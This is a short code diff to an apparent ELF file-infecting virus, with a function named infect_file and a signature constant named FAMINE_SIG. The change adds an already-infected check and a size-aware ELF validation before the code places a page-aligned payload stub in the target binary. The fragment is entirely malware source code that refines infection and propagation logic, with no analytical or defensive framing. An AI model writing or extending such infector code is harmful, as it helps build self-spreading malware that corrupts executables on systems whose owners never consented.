@@ -17,7 +17,7 @@ int infect_file(const char *path)
 	close(fd);
 	if (map == MAP_FAILED)
 		return (LOG("mmap failed\n"), 1);
-	if (!is_valid_elf((Elf64_Ehdr *)map))
+	if (!is_valid_elf((Elf64_Ehdr *)map, st.st_size) || memmem(map, st.st_size, FAMINE_SIG, sizeof(FAMINE_SIG) - 1))
 		return (munmap(map, st.st_size), 1);
 
 	f.stub_offset = (st.st_size + PAGE_SIZE - 1) & ~((size_t)PAGE_SIZE - 1);
